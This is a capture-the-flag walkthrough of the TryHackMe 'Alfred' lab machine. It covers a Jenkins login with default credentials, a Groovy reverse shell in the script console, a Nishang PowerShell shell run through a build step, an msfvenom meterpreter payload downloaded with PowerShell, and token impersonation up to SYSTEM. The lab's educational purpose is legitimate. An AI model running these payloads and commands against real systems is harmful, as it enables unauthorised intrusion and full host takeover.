---
layout: page
title: Alfred
description: Discovered exposed script panel via default credentials
img: 
importance: 4
category: TryHackMe
team: Red Team Labs
related_publications: false
---

<div class="row justify-content-sm-center">
    <div class="col-sm-4 mt-3 mt-md-0">
        {% include figure.liquid loading="eager" path="/assets/img/alfred/logo.png" title="THM Alfred Logo" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<h2>Link</h2>
<a href="https://tryhackme.com/room/alfred">Room Link</a>

<br/>
<h2>Process</h2>

<br/>
Can we beat Alfred and get into Wayne Manor.  Let's find out.

Let's use nmap to the get the services that are available for us to explore.

{% capture nmap %}
┌──(kali㉿kali)-[~/Documents/thm/alfred]
└─$  sudo nmap -sC -sV -A -O -oN nmap -Pn 10.10.215.127
Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-26 01:01 AEDT
Nmap scan report for 10.10.215.127
Host is up (0.26s latency).
Not shown: 997 filtered tcp ports (no-response)
PORT     STATE SERVICE    VERSION
80/tcp   open  http       Microsoft IIS httpd 7.5
|_http-title: Site doesn't have a title (text/html).
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/7.5
3389/tcp open  tcpwrapped
| rdp-ntlm-info: 
|   Target_Name: ALFRED
|   NetBIOS_Domain_Name: ALFRED
|   NetBIOS_Computer_Name: ALFRED
|   DNS_Domain_Name: alfred
|   DNS_Computer_Name: alfred
|   Product_Version: 6.1.7601
|_  System_Time: 2025-02-25T14:01:49+00:00
8080/tcp open  http       Jetty 9.4.z-SNAPSHOT
|_http-title: Site doesn't have a title (text/html;charset=utf-8).
|_http-server-header: Jetty(9.4.z-SNAPSHOT)
| http-robots.txt: 1 disallowed entry 
|_/

<snip>
{% endcapture %}
{% include terminal.html language='bash' title='bash' content=nmap %}

<br />
Run the nmap against all of the ports just incase there are any non-standard ports available.

{% capture nmapfull %}
┌──(kali㉿kali)-[~/Documents/thm/alfred]
└─$ sudo nmap -sS -p- -oN nmapfull -Pn 10.10.215.127
Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-26 01:01 AEDT
Nmap scan report for 10.10.215.127
Host is up (0.27s latency).
Not shown: 65533 filtered tcp ports (no-response)
PORT     STATE SERVICE
80/tcp   open  http
8080/tcp open  http-proxy

Nmap done: 1 IP address (1 host up) scanned in 582.35 seconds
{% endcapture %}
{% include terminal.html language='bash' title='bash' content=nmapfull %}

<br />
Check the Landing Page of the website.

<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid path="assets/img/alfred/landing.png" title="Landing Page" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Let's try admin:admin as credentials because it is what I alsways try whenever I just want to see the login request.  It worked!  Neat.

<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid path="assets/img/alfred/dashboard.png" title="Dashboard" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Start a netcat listener that listens on port 443.

{% capture startlistener443 %}
┌──(kali㉿kali)-[~/Documents/thm/alfred]
└─$ sudo nc -nlvp 443                             
listening on [any] 443 ...
{% endcapture %}
{% include terminal.html language='bash' title='bash' content=startlistener443 %}

<br />
Use revshells to look up a Groovy payload.

<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid path="assets/img/alfred/revshells.png" title="Revshells" class="img-fluid rounded z-depth-1" %}
    </div>
</div>
<a href="https://www.revshells.com/">https://www.revshells.com/</a>


<br />
The manage section has a script console that executes Groovy.  Convenient, since we just looked up Groovy code.

<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid path="assets/img/alfred/manage.png" title="Manage" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Update the script to execute cmd.exe since this is a windows machine.

{% capture groovyscript %}
String host="10.4.119.29";
int port=443;
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();
Socket s=new Socket(host,port);
InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();
while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());
                     while(pe.available()>0)so.write(pe.read());
                     while(si.available()>0)po.write(si.read());
                     so.flush();po.flush();
                     Thread.sleep(50);
                     try {p.exitValue();
                          break;}
                     catch (Exception e){}};
  p.destroy();
s.close();
{% endcapture %}
{% include terminal.html language='groovy' title='groovy' content=groovyscript %}

<br />
Use the Groovy script in the script console and execute it.

<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid path="assets/img/alfred/console.png" title="Console" class="img-fluid rounded z-depth-1" %}
    </div>
</div>


<br />
Check the listener and catch the shell.

{% capture catch443shell %}
┌──(kali㉿kali)-[~/Documents/thm/alfred]
└─$ sudo nc -nlvp 443                             
listening on [any] 443 ...
connect to [10.4.119.29] from (UNKNOWN) [10.10.215.127] 49226
{% endcapture %}

{% capture catch443windowsshell %}
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Program Files (x86)\Jenkins>
{% endcapture %}

{% include terminal.html language='bash' title='bash' content=catch443shell %}

{% include terminal.html language='cmd' title='cmd.exe' content=catch443windowsshell %}

<br />
Now, re-reading the description, it looks like this wasn't the intended way to complete the box.  So we will kill the shell and try again.  To get started, copy Nishang reverse shell PowerShell script into the local working folder.

{% capture cpnishang %}
┌──(kali㉿kali)-[~/Documents/thm/alfred]
└─$ cp $(locate Invoke-PowerShellTcp.ps1) .
{% endcapture %}
{% include terminal.html language='bash' title='bash' content=cpnishang %}

<br />
Update the file to Invoke the method at the end of the file.

{% capture nishangscript %}
function Invoke-PowerShellTcp 
{ 
<#
.SYNOPSIS
Nishang script which can be used for Reverse or Bind interactive PowerShell from a target.

<snip>

    catch
    {
        Write-Warning "Something went wrong! Check if the server is reachable and you are using the correct port." 
        Write-Error $_
    }
}
Invoke-PowerShellTcp -Reverse -IPAddress 10.4.119.29 -Port 4444
{% endcapture %}
{% include terminal.html language='powershell' title='PowerShell' content=nishangscript %}

<br />
Start another netcat listener...again.

{% capture start4444listener %}
┌──(kali㉿kali)-[~/Documents/thm/alfred]
└─$ nc -nlvp 4444 
listening on [any] 4444 ...
{% endcapture %}
{% include terminal.html language='bash' title='bash' content=start4444listener %}

<br />
Start a webserver to serve the Nishang script.

{% capture pyserver %}
┌──(kali㉿kali)-[~/Documents/thm/alfred]
└─$ python3 -m http.server          
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
{% endcapture %}
{% include terminal.html language='bash' title='bash' content=pyserver %}

<br />
Click on configure in the project options.

<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid path="assets/img/alfred/configure.png" title="Configure" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Update the build section with a command to invoke powershell to execute our script.

<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid path="assets/img/alfred/buildcmd.png" title="Build Command" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Click on Build Now in the side menu.

<div class="row justify-content-sm-center">
    <div class="col-sm-8 mt-3 mt-md-0">
        {% include figure.liquid path="assets/img/alfred/buildnow.png" title="Build Now" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Check the listener and catch the shell.

{% capture catch4444shell %}
┌──(kali㉿kali)-[~/Documents/thm/alfred]
└─$ nc -nlvp 4444 
listening on [any] 4444 ...
connect to [10.4.119.29] from (UNKNOWN) [10.10.215.127] 49248
{% endcapture %}

{% capture catchpowershellshell %}
Windows PowerShell running as user bruce on ALFRED
Copyright (C) 2015 Microsoft Corporation. All rights reserved.

PS C:\Program Files (x86)\Jenkins\workspace\project>
{% endcapture %}

{% include terminal.html language='bash' title='bash' content=catch4444shell %}

{% include terminal.html language='powershell' title='PowerShell' content=catchpowershellshell %}

<br />
Use msfvenom to generate a meterpreter payload.

{% capture genmeter %}
┌──(kali㉿kali)-[~/Documents/thm/alfred]
└─$ msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=10.4.119.29 LPORT=443 -f exe -o meter.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
Found 1 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 381 (iteration=0)
x86/shikata_ga_nai chosen with final size 381
Payload size: 381 bytes
Final size of exe file: 73802 bytes
Saved as: meter.exe
{% endcapture %}
{% include terminal.html language='bash' title='bash' content=genmeter %}

<br />
Use PowerShell to transfer the payload to the victim machine.

{% capture transfermeter %}
PS C:\Program Files (x86)\Jenkins\workspace\project> powershell "(New-Object System.Net.WebClient).Downloadfile('http://10.4.119.29:8000/meter.exe','meter.exe')"
PS C:\Program Files (x86)\Jenkins\workspace\project> dir


    Directory: C:\Program Files (x86)\Jenkins\workspace\project


Mode                LastWriteTime     Length Name                              
----                -------------     ------ ----                              
-a---         2/25/2025   2:38 PM      73802 meter.exe
{% endcapture %}
{% include terminal.html language='powershell' title='PowerShell' content=transfermeter %}

<br />
Set-up an multi/handler to catch the meterpreter.

{% capture startmultihandler %}
┌──(kali㉿kali)-[~/Documents/thm/alfred]
└─$ msfconsole -q                                                                                                                  
msf6 > use exploit/multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set PAYLOAD windows/meterpreter/reverse_tcp
PAYLOAD => windows/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set LHOST tun0
LHOST => tun0
msf6 exploit(multi/handler) > set LHOST tun0
LHOST => tun0
msf6 exploit(multi/handler) > set lport 443
lport => 443
msf6 exploit(multi/handler) > run
[*] Started reverse TCP handler on 10.4.119.29:443
{% endcapture %}
{% include terminal.html language='bash' title='bash' content=startmultihandler %}

<br />
Execute the meterpreter payload.

{% capture runmeterexe %}
PS C:\Program Files (x86)\Jenkins\workspace\project> Start-Process "meter.exe"
{% endcapture %}
{% include terminal.html language='powershell' title='PowerShell' content=runmeterexe %}

<br />
Check the listener and catch the session.

{% capture catchmeter %}
msf6 exploit(multi/handler) > run
[*] Started reverse TCP handler on 10.4.119.29:443 
[*] Sending stage (177734 bytes) to 10.10.215.127
[*] Meterpreter session 1 opened (10.4.119.29:443 -> 10.10.215.127:49260) at 2025-02-26 01:42:29 +1100

meterpreter >
{% endcapture %}
{% include terminal.html language='bash' title='bash' content=catchmeter %}

<br />
Research more about access tokens.

<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid path="assets/img/alfred/mstokens.png" title="MS Tokens" class="img-fluid rounded z-depth-1" %}
    </div>
</div>
<a href="https://learn.microsoft.com/en-us/windows/win32/secauthz/access-tokens">https://learn.microsoft.com/en-us/windows/win32/secauthz/access-tokens</a>

<br />
Read up on Exploit-DB about abusing these tokens.

<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid path="assets/img/alfred/dbtokens.png" title="Exploit-DB Tokens" class="img-fluid rounded z-depth-1" %}
    </div>
</div>
<a href="https://www.exploit-db.com/papers/42556">https://www.exploit-db.com/papers/42556</a>

<br />
Run whoami /priv to get a list of the privileges.

{% capture whoamipriv %}
C:\Program Files (x86)\Jenkins\workspace\project>whoami /priv
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                  Description                               State   
=============================== ========================================= ========
SeIncreaseQuotaPrivilege        Adjust memory quotas for a process        Disabled
SeSecurityPrivilege             Manage auditing and security log          Disabled
SeTakeOwnershipPrivilege        Take ownership of files or other objects  Disabled
SeLoadDriverPrivilege           Load and unload device drivers            Disabled
SeSystemProfilePrivilege        Profile system performance                Disabled
SeSystemtimePrivilege           Change the system time                    Disabled
SeProfileSingleProcessPrivilege Profile single process                    Disabled
SeIncreaseBasePriorityPrivilege Increase scheduling priority              Disabled
SeCreatePagefilePrivilege       Create a pagefile                         Disabled
SeBackupPrivilege               Back up files and directories             Disabled
SeRestorePrivilege              Restore files and directories             Disabled
SeShutdownPrivilege             Shut down the system                      Disabled
SeDebugPrivilege                Debug programs                            Enabled 
SeSystemEnvironmentPrivilege    Modify firmware environment values        Disabled
SeChangeNotifyPrivilege         Bypass traverse checking                  Enabled 
SeRemoteShutdownPrivilege       Force shutdown from a remote system       Disabled
SeUndockPrivilege               Remove computer from docking station      Disabled
SeManageVolumePrivilege         Perform volume maintenance tasks          Disabled
SeImpersonatePrivilege          Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege         Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege   Increase a process working set            Disabled
SeTimeZonePrivilege             Change the time zone                      Disabled
SeCreateSymbolicLinkPrivilege   Create symbolic links                     Disabled
{% endcapture %}
{% include terminal.html language='cmd' title='cmd.exe' content=whoamipriv %}

<br />
Load the incognito extension.

{% capture loadincognito %}
meterpreter > load incognito
Loading extension incognito...Success.
{% endcapture %}
{% include terminal.html language='bash' title='bash' content=loadincognito %}

<br />
List all of the tokens that are available to impersonate.

{% capture listtoken %}
meterpreter > list_tokens -g
[-] Warning: Not currently running as SYSTEM, not all tokens will be available
             Call rev2self if primary process token is SYSTEM

Delegation Tokens Available
========================================
\
BUILTIN\Administrators
BUILTIN\Users
NT AUTHORITY\Authenticated Users
NT AUTHORITY\NTLM Authentication
NT AUTHORITY\SERVICE
NT AUTHORITY\This Organization
NT SERVICE\AudioEndpointBuilder
NT SERVICE\CertPropSvc
NT SERVICE\CscService
NT SERVICE\iphlpsvc
NT SERVICE\LanmanServer
NT SERVICE\PcaSvc
NT SERVICE\Schedule
NT SERVICE\SENS
NT SERVICE\SessionEnv
NT SERVICE\TrkWks
NT SERVICE\UmRdpService
NT SERVICE\UxSms
NT SERVICE\Winmgmt
NT SERVICE\wuauserv

Impersonation Tokens Available
========================================
No tokens available
{% endcapture %}
{% include terminal.html language='bash' title='bash' content=listtoken %}

<br />
Impersonate the Administrators token.

{% capture impersonatetoken %}
meterpreter > impersonate_token "BUILTIN\Administrators"
[-] Warning: Not currently running as SYSTEM, not all tokens will be available
             Call rev2self if primary process token is SYSTEM
[+] Delegation token available
[+] Successfully impersonated user NT AUTHORITY\SYSTEM
{% endcapture %}
{% include terminal.html language='bash' title='bash' content=impersonatetoken %}

<br />
Run getuid to confirm system.

{% capture getuid %}
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
{% endcapture %}
{% include terminal.html language='bash' title='bash' content=getuid %}

{% raw %}
```bash

```
{% endraw %}

<br />
Run ps to get a list of the processes.

{% capture meterps %}
meterpreter > ps

Process List
============

 PID   PPID  Name                  Arch  Session  User                          Path
 ---   ----  ----                  ----  -------  ----                          ----
 0     0     [System Process]
 4     0     System                x64   0
 396   4     smss.exe              x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\smss.exe
 524   516   csrss.exe             x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\csrss.exe
 572   564   csrss.exe             x64   1        NT AUTHORITY\SYSTEM           C:\Windows\System32\csrss.exe
 580   516   wininit.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\wininit.exe
 608   564   winlogon.exe          x64   1        NT AUTHORITY\SYSTEM           C:\Windows\System32\winlogon.exe
 668   580   services.exe          x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\services.exe
 676   580   lsass.exe             x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\lsass.exe
 684   580   lsm.exe               x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\lsm.exe
 720   1332  meter.exe             x86   0        alfred\bruce                  C:\Program Files (x86)\Jenkins\workspace\project\meter.exe
 772   668   svchost.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 848   668   svchost.exe           x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\svchost.exe
 864   668   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
 920   608   LogonUI.exe           x64   1        NT AUTHORITY\SYSTEM           C:\Windows\System32\LogonUI.exe
 936   668   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
 988   668   svchost.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 1012  668   svchost.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 1076  668   svchost.exe           x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\svchost.exe
 1196  524   conhost.exe           x64   0        alfred\bruce                  C:\Windows\System32\conhost.exe
 1212  668   spoolsv.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\spoolsv.exe
 1244  668   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
 1332  2276  powershell.exe        x86   0        alfred\bruce                  C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
 1360  668   amazon-ssm-agent.exe  x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\Amazon\SSM\amazon-ssm-agent.exe
 1416  668   svchost.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 1452  668   LiteAgent.exe         x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\Amazon\Xentools\LiteAgent.exe
 1480  668   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
 1628  668   jenkins.exe           x64   0        alfred\bruce                  C:\Program Files (x86)\Jenkins\jenkins.exe
 1696  668   svchost.exe           x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\svchost.exe
 1720  668   svchost.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 1844  1628  java.exe              x86   0        alfred\bruce                  C:\Program Files (x86)\Jenkins\jre\bin\java.exe
 1868  668   Ec2Config.exe         x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\Amazon\Ec2ConfigService\Ec2Config.exe
 1952  524   conhost.exe           x64   0        alfred\bruce                  C:\Windows\System32\conhost.exe
 2276  1844  cmd.exe               x86   0        alfred\bruce                  C:\Windows\SysWOW64\cmd.exe
 2336  772   WmiPrvSE.exe          x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\wbem\WmiPrvSE.exe
 2772  1844  cmd.exe               x86   0        alfred\bruce                  C:\Windows\SysWOW64\cmd.exe
 2780  668   sppsvc.exe            x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\sppsvc.exe
 2788  524   conhost.exe           x64   0        alfred\bruce                  C:\Windows\System32\conhost.exe
 2844  668   SearchIndexer.exe     x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\SearchIndexer.exe
 3008  668   svchost.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 3032  668   TrustedInstaller.exe  x64   0        NT AUTHORITY\SYSTEM           C:\Windows\servicing\TrustedInstaller.exe
{% endcapture %}
{% include terminal.html language='bash' title='bash' content=meterps %}

<br />
Migrate to a process that is owned by system.

{% capture migrate1212 %}
meterpreter > migrate 1212
[*] Migrating from 720 to 1212...
[*] Migration completed successfully.
{% endcapture %}
{% include terminal.html language='bash' title='bash' content=migrate1212 %}

<br />
Get the user.txt flag.

{% capture userflag %}
C:\Windows\system32>type C:\Users\bruce\Desktop\user.txt
type C:\Users\bruce\Desktop\user.txt
<redacted>
C:\Windows\system32>ipconfig
ipconfig

Windows IP Configuration


Ethernet adapter Local Area Connection 2:

   Connection-specific DNS Suffix  . : eu-west-1.compute.internal
   Link-local IPv6 Address . . . . . : fe80::29e7:fd45:ab9d:c675%13
   IPv4 Address. . . . . . . . . . . : 10.10.215.127
   Subnet Mask . . . . . . . . . . . : 255.255.0.0
   Default Gateway . . . . . . . . . : 10.10.0.1

Tunnel adapter isatap.eu-west-1.compute.internal:

   Media State . . . . . . . . . . . : Media disconnected
   Connection-specific DNS Suffix  . : eu-west-1.compute.internal
{% endcapture %}
{% include terminal.html language='cmd' title='cmd.exe' content=userflag %}

<br />
Get the root.txt flag.

{% capture rootflag %}
C:\Windows\system32>type C:\Windows\System32\config\root.txt
type C:\Windows\System32\config\root.txt
<redacted>

C:\Windows\system32>ipconfig
ipconfig

Windows IP Configuration


Ethernet adapter Local Area Connection 2:

   Connection-specific DNS Suffix  . : eu-west-1.compute.internal
   Link-local IPv6 Address . . . . . : fe80::29e7:fd45:ab9d:c675%13
   IPv4 Address. . . . . . . . . . . : 10.10.215.127
   Subnet Mask . . . . . . . . . . . : 255.255.0.0
   Default Gateway . . . . . . . . . : 10.10.0.1

Tunnel adapter isatap.eu-west-1.compute.internal:

   Media State . . . . . . . . . . . : Media disconnected
   Connection-specific DNS Suffix  . : eu-west-1.compute.internal
{% endcapture %}
{% include terminal.html language='cmd' title='cmd.exe' content=rootflag %}

<br />
And with that Alfred works for us now.  Hope, you enjoyed.  See you in the next one.